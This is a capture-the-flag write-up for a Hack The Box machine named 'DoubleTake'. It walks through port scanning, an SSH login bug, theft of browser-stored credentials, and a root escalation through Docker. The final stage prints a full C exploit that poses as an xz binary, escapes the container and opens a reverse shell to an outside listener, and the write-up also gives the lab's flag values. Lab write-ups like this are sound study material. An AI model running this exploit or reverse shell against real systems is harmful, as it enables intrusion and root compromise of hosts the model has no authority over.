---
title: "DoubleTake"
platform: HTB
date: 2026-11-14
difficulty: easy
locked: false
tags: ["linux"]
---

## Reconnaissance

As always we will start with the port recognition.
```bash
…/workbench/VMs/DoubleTake   26s
▌✦ sudo nmap -p- -sS -Pn -n --open 10.129.98.5 --min-rate 5000 -oG content/allPorts 
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-14 23:40 +0100
Nmap scan report for 10.129.98.5
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.41 seconds

…/workbench/VMs/DoubleTake   12s
▌✦ sudo nmap -p22,80 -sVC -Pn -n --open 10.129.98.5 --min-rate 5000 -oG content/targeted
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-14 23:43 +0100
Nmap scan report for 10.129.98.5
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 UNAUTHORIZED\x0D
|_  Basic realm=Zentara
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.40 seconds
```

We start seeing that the page requests us authorization.

## Explotation

We did not have anything to vuln on the webpage but after checking we've seen that OpenSSH 10.6 is vulnerable to [CVE-2026-123158](https://sshhole.com) most known as *sshhole* on Alpine Linux.

This vulnerablitity, on the second test of the password when you stablish an ssh connection, changes the password from it's value to `*` granting access to the console and as it happens on Alpine Linux, we will try to log in using the `alpine` user.

```bash
…/VMs/DoubleTake/exploits   14s
▌✦ ssh alpine@10.129.98.54
alpine@10.129.98.54's password: 
Permission denied, please try again.
alpine@10.129.98.54's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

7f906e0ee8ec:~$ 
```

Seems that we are on a container.

After checking we saw that there are a `.dockerenv` on `/` but the information that it's empty.

Checking under the `/home/alpine` folder we were able to see some files that belongs to their browser and contains access to applications.
```bash
7f906e0ee8ec:~$ cat .mozilla/firefox/zentara.default/logins.json 
{"nextId":2,"logins":[{"id":1,"hostname":"http://172.17.0.1","httpRealm":"Zentara","formActionOrigin":null,"usernameField":"","passwordField":"","encryptedUsername":"Ym9i","encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==","guid":"{a1b2c3d4-e5f6-7890-abcd-ef1234567890}","encType":0,"timeCreated":1730000000000,"timeLastUsed":1730900000000,"timePasswordChanged
```

with this we have an User and a Password but those are encoded with `base64` so we will decode them.
```bash
…/VMs/DoubleTake/exploits 
▌✦ echo "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==" | base64 -d
CorrectHorseBatteryStaple                                                                                                                                                              
…/VMs/DoubleTake/exploits 
▌✦ echo "Ym9i" | base64 -d                                
bob
```

Now we are able to access the page.

```bash
…/VMs/DoubleTake/exploits 
▌✦ curl -u "bob:CorrectHorseBatteryStaple" http://10.129.98.54 -o /dev/null -s -w '%{http_code}'; echo
200
```

## Privilege escalation

### bob

Before carry on with checking the page, we will test the credentials that we have gathered before to see if we can do a ssh session to the user `bob`.
```bash
…/VMs/DoubleTake/exploits 
▌✦ sshpass -p 'CorrectHorseBatteryStaple' ssh bob@10.129.98.54
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

7f906e0ee8ec:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
7f906e0ee8ec:~$ cat user.txt 
7206342928ac2c2508a63faee9b7d068
```

### Root

checking on the status side of the webpage we are able to see that the docker version is `Docker 29.5.0`
```bash
…/VMs/DoubleTake/exploits 
▌✦ curl -u "bob:CorrectHorseBatteryStaple" http://10.129.98.54/status -s | grep Docker
    <div class="value">Docker 29.5.0</div>
```

Checking for a while we are able to see that the webpage has an endpoint to upload files, in a conversation that someone had we are able to see that the upload must be a compressed file and this Docker version is vulnerable to [CVE-2026-41567](https://nvd.nist.gov/vuln/detail/cve-2026-41567)

#### CVE-2026-41567

This vulnerability allows us to upload a trojanized decompression binary that can be executed with the daemon permissions, which usually are root permissions in case that Docker is not configured correctly.

For that, as this vuln affects only to `xz` or `unpigz`, we will create our own `xz` binary.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
  mount("proc", "/proc", "proc", 0, NULL);
  chroot("/proc/1/root");
  chdir("/");
  execl("/bin/bash","bash", "-c", "bash -i >& /dev/tcp/10.10.16.85/1234 0>&1", NULL);
  return 1;
}
```

And now  we will compile, compress and upload it.
```bash
…/VMs/DoubleTake/exploits   8m16s
▌✦ gcc -static -o xz xz.c 

…/VMs/DoubleTake/exploits 
▌✦ mkdir pkg/usr/bin -p

…/VMs/DoubleTake/exploits 
▌✦ cp xz pkg/usr/bin/

…/VMs/DoubleTake/exploits 
▌✦ cd pkg && tar cf ../plant.tar usr/bin/xz

…/DoubleTake/exploits/pkg 
▌✦ cd ../ && ls                            
 pkg   plant.tar   xz   xz.c

…/VMs/DoubleTake/exploits 
▌✦ curl -u "bob:CorrectHorseBatteryStaple" http://10.129.98.54/deploy -F 'archive=@plant.tar' -F 'workspace=/'
{"deployment":{"created_at":1794773864,"filename":"plant.tar","id":"dep-98b9bb","size":860160,"status":"success","workspace":"/"},"status":"success"}
```

With that we have our decompression binary uploaded, now we just need to start a listener on a shell and upload a `.tar.xz` file to trigger it.

*Shell 1*
```bash
…/VMs/DoubleTake/exploits 
▌✦ echo x > t && tar cf - t | xz > trigger.tar.xz

…/VMs/DoubleTake/exploits 
▌✦ curl -u "bob:CorrectHorseBatteryStaple" http://10.129.98.54/deploy -F 'archive=@trigger.tar.xz' -F 'workspace=/workspace'
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

*Shell 2*
```bash
…/VMs/DoubleTake/exploits   17s
▌✦ nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.129.98.54 50756
bash: cannot set terminal process group (1372): Inappropriate ioctl for device
bash: no job control in this shell
root@doubletake:/# id 
id 
uid=0(root) gid=0(root) groups=0(root)
root@doubletake:/# cat /root/root.txt
cat /root/root.txt
60fcecc26de837712b816172e57cbcbe
root@doubletake:/#
```
